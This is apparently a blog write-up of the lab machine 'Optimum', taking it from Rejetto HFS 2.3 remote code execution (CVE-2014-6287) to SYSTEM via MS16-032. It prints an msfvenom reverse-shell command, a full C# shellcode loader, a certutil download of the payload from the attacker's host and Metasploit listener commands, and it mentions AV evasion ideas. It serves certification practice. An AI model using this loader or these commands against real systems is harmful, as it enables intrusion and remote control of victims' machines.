+++
date = '2026-06-26T20:20:13+02:00'
draft = false
title = 'Optimum Writeup EN'
+++
**Name**: **`joy.scd01`**

**Date**: **`19/01/2026`**

![Optimum.jpeg](/images/imgs_optimum/Optimum.jpeg)

---
# Introduction

**_Optimum_** is an **Easy-level Windows** machine that perfectly captures the essence of classic **eJPT** beginner-friendly boxes.

The exploitation path is very straightforward and relies on identifying an outdated and vulnerable web file server. Initial access is achieved by exploiting a well-known **Remote Command Execution** (**RCE**) vulnerability in **Rejetto HTTP File Server 2.3**. For privilege escalation, after some manual enumeration hits a dead end, pivoting to Metasploit and utilizing the **Local Exploit Suggester** quickly reveals a missing Windows patch, leading to a kernel exploit that grants **SYSTEM** access.

---
# Techniques Used

- **Remote Code Execution → CVE-2014-6287**
- **Kernel Exploitation → MS16-032**

---
# Enumeration

## nmap

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV -Pn -T5 optimum
```

```bash
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-title: HFS /
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Open Port**:
- **80**/tcp - http HttpFileServer httpd 2.3

## HTTP - Web Enumeration

After running my initial **nmap** scans (which showed an open HTTP port), I immediately browsed to the web application.

The server was hosting a web interface, and looking at the "Server information" panel in the bottom left corner, the exact software and version were explicitly disclosed: **HttpFileServer 2.3**.

![webpage.png](/images/imgs_optimum/webpage.png)

## searchsploit 

Knowing the exact software and version, I used **searchsploit** to look for known vulnerabilities.

```bash
searchsploit httpfileserver
```

![searchsploit.png](/images/imgs_optimum/searchsploit.png)

The search returned a very promising result: 
- **`Rejetto HttpFileServer 2.3.x - Remote Command Execution`**.


This specific vulnerability is cataloged as **CVE-2014-6287**.

**Note**: _This vulnerability occurs due to a flaw in how the HFS application's parser handles macros (specifically the **findMacroMarker** function). By sending a specially crafted **HTTP** request containing a **null byte** (**%00**) within the search parameter, an attacker can trick the server into evaluating malicious input as a macro, leading to **arbitrary Remote Command Execution**._

---
# Initial Access | CVE-2014-6287 → RCE

I normally prefer a manual, **OSCP-style** approach, so I decided to test a few manual payloads first. However, my initial attempts to manually inject a reverse shell payload were unsuccessful.

To save time, I searched **GitHub** for a reliable Python exploit for **CVE-2014-6287** and found this one:
https://github.com/rahisec/rejetto-http-file-server-2.3.x-RCE-exploit-CVE-2014-6287

I cloned the script, set up my **netcat** listener on port 22667, and ran the exploit.

```bash
python3 exploit.py
```

It worked and I caught a reverse shell as the user **kostas**:

![initial_access.png](/images/imgs_optimum/initial_access.png)

From there, I navigated to the user's Desktop and grabbed the **User flag**:

![user_flag.png](/images/imgs_optimum/user_flag.png)

---
# Privilege Escalation | Metasploit & MS16-032

With initial access secured, I uploaded and ran **winPEAS** to look for quick privilege escalation vectors, but it didn't yield any immediate or obvious paths.

Since I already knew the exact vulnerability used for the initial foothold, and because I was actively preparing for the **eJPT** certification at the time, I decided to pivot to **Metasploit** to grab a more stable **Meterpreter** shell and take advantage of its post-exploitation modules.

However, instead of taking the easy route and firing off the default **`rejetto_hfs_exec`** exploit module, I decided to add a touch of class to the process.

![csharp.png](/images/imgs_optimum/csharp.png)

## Malware Development

After checking some system information about OS and Architecture through my active session:

```bash
systeminfo
```

I generated a **Meterpreter** reverse shell payload using **`msfvenom`**:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f csharp > fall.cs
```

and embedded the raw shellcode into a custom **C# shellcode loader**:

```cs
using System;
using System.Runtime.InteropServices;

namespace ShellcodePayload
{
    class Payload
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main()
        {
            byte[] shellCode = new byte[] {/*Raw Bytes Here*/};

            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            Marshal.Copy(shellCode, 0, funcAddr, shellCode.Length);

            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

**Note**: _This **C#** loader works by using **`P/Invoke`** to call unmanaged standard Win32 APIs. First, **`VirtualAlloc`** allocates a chunk of memory with **`PAGE_EXECUTE_READWRITE`** permissions so the processor is allowed to execute it. Next, **`Marshal.Copy`** writes the raw **msfvenom** shellcode bytes into that newly allocated memory space. Finally, **`CreateThread`** points execution to the shellcode, and **`WaitForSingleObject`** prevents the main program from exiting prematurely by waiting indefinitely (**0xFFFFFFFF**), ensuring our **Meterpreter** session stays alive._

After compiling the executable on my machine:

```bash
msc shellcode_loader.cs -out:fall.exe
```

I transferred it to the target Windows host through my active reverse shell:

```bash
# attacker machine
python3 -m http.server

# victim machine
certutil -urlcache -split -f http://10.10.16.77:8000/fall.exe fall.exe
```

Now I opened **Metasploit** and set up a **Meterpreter** listener:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <attacker_port>
run
```

Once executed, it called back to my `multi/handler`, granting me a fully functional and stable **Meterpreter** session.

![msf_shell.jpeg](/images/imgs_optimum/msf_shell.jpeg)

**Note**: _To be completely objective, building a custom **C#** loader in this scenario could be considered overkill and a bit of a time-waster, especially since we already know the exact vulnerability and **Metasploit** has a dedicated, module for it. Furthermore, this code represents the absolute bare minimum of **malware development**. This simple payload could be heavily improved by implementing **obfuscation** techniques and **process injection** (injecting the shellcode into legitimate Windows processes) to **bypass modern AVs** like **Windows Defender** and establish **stealthy persistence**. However, it was a highly educational and fun exercise to test these core maldev mechanics on a simple, restriction-free box._

Once the **Meterpreter** session was established, I backgrounded it and loaded the **`Local Exploit Suggester`**:

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

![exploit_suggester.png](/images/imgs_optimum/exploit_suggester.png)

The suggester analyzed the system and identified several potential vulnerabilities. One of the most reliable Windows kernel exploits on that list was **MS16-032** (**Secondary Logon Handle Privilege Escalation**):

![ms16_privesc.png](/images/imgs_optimum/ms16_privesc.png)

I loaded the suggested module, configured it to target my active session, and fired it off:

![system_proof](/images/imgs_optimum/system_proof.png)

I was now **NT AUTHORITY\SYSTEM**.

I navigated to the **Administrator**'s Desktop and read the **Root flag**:

![root_flag.png](/images/imgs_optimum/root_flag.png)

---
# Final Thoughts

**_Optimum_** is an easy and relaxing box that serves as a perfect practice ground for the **eJPT** certification. 

It highlights a very realistic workflow: enumerating specific software versions, finding public exploits, and adapting when manual enumeration (like **WinPEAS**) hits a dead end. While pivoting to **Metasploit** to leverage the **Local Exploit Suggester** is a standard and highly effective technique for older Windows machines, taking the extra step to write and compile a custom **C# shellcode loader** made this box significantly more rewarding.

Even though building a custom dropper was arguably overkill for such a simple vulnerability, it was an excellent opportunity to raise the bar and practice core **malware development** concepts in a restriction-free environment. Pushing beyond the basic, pre-packaged exploit modules and building custom payloads is exactly what builds the mindset needed for more advanced certifications.

**Sources**:

- **CVE-2014-6287 Exploit** | https://github.com/rahisec/rejetto-http-file-server-2.3.x-RCE-exploit-CVE-2014-6287